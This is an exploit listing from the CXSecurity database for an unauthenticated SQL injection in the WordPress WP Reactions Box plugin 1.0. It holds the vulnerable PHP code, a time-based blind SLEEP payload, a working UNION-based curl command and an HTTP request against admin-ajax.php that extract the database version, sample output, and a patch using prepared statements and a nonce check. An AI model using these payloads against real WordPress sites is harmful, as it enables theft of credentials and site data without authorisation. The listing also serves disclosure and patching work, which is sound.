---
title: WordPress WP Reactions Box Plugin 1.0 - SQL Injection
url: https://cxsecurity.com/issue/WLB-2025080023
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-29
fetch_date: 2025-10-07T00:13:35.746382
---

# WordPress WP Reactions Box Plugin 1.0 - SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress WP Reactions Box Plugin 1.0 - SQL Injection** **2025.08.28**  Credit:  **[bRpsd](https://cxsecurity.com/author/bRpsd/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: WordPress WP Reactions Box Plugin 1.0 - SQL Injection
# Google Dork: N/A
# Date: 2025-08-24
# Exploit Author: bRpsd cy[at]live.no
# Vendor Homepage: https://wordpress.org/plugins/wp-reactions-box/
# Software Link: https://downloads.wordpress.org/plugin/wp-reactions-box.zip
# Version: <= 1.0
# Tested on: WordPress 6.x
# CVE: N/A
Vulnerability: Unauthenticated SQL Injection in AJAX Handler
CVSS: 9.8 CRITICAL (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
Affected File: wp-reactions.php:779-625 (vulnerable query in hkp\_reactions\_votes function, called from hkp\_reactions\_ajax\_populate)
Vulnerable Code:
=========================================================================================
776: function hkp\_reactions\_ajax\_populate() {
777: global $wpdb;
779: $postID = $\_POST['postID']; // No sanitization
780: $options = get\_option( 'hkp\_reactions\_options' );
781: $reactionsMoods = hkp\_reactions\_box\_moods( $options );
782: $reactionsObj = hkp\_reactions\_votes( $postID ); // Passes to vulnerable function
...
618: function hkp\_reactions\_votes( $postID = NULL ) {
620: global $wpdb;
625: $votes = $wpdb->get\_row( "SELECT \* FROM {$wpdb->prefix}hkp\_reactions\_posts WHERE ID=" . $postID );
=========================================================================================
Parameter: $\_POST['postID']
For time-based blind SQLi (if no data returned): Use postID=1%20AND%20IF(1=1,SLEEP(5),0) and observe response delay.
CURL Proof of concept:
curl -X POST http://localhost/wordpress/wp-admin/admin-ajax.php \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "action=hkp\_reactions\_populate&postID=0%20UNION%20SELECT%200%20as%20ID,%40%40version%20as%20bummer,0%20as%20good,0%20as%20sad,0%20as%20lol,0%20as%20scary,0%20as%20shocked,0%20as%20boring,0%20as%20sweet,0%20as%20angry,0%20as%20nerdy,now()%20as%20time"
HTTP Proof of concept:
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
action=hkp\_reactions\_populate&postID=0%20UNION%20SELECT%200%20as%20ID,%40%40version%20as%20bummer,0%20as%20good,0%20as%20sad,0%20as%20lol,0%20as%20scary,0%20as%20shocked,0%20as%20boring,0%20as%20sweet,0%20as%20angry,0%20as%20nerdy,now()%20as%20time
Both Response:
{"reactions":{"bummer":"10.4.21-MariaDB"
Impact:
Complete database compromise including:
Extraction of WordPress configuration (wp-config.php contents)
User credentials and password hashes
All website content and sensitive data
Potential for privilege escalation and remote code execution
Patch:
=======================================================================
function hkp\_reactions\_votes( $postID = NULL ) {
global $wpdb;
if ( !$postID ) {
global $post;
$postID = $post->ID;
}
$postID = intval($postID); // Sanitize input
$votes = $wpdb->get\_row( $wpdb->prepare( "SELECT \* FROM {$wpdb->prefix}hkp\_reactions\_posts WHERE ID = %d", $postID ) );
return $votes;
}
=======================================================================
Additionally, add a nonce check in hkp\_reactions\_ajax\_populate() similar to the cast\_vote endpoint: check\_ajax\_referer('hkp-wp-feelbox', 'token'); (require passing a token in POST).

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025080023)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top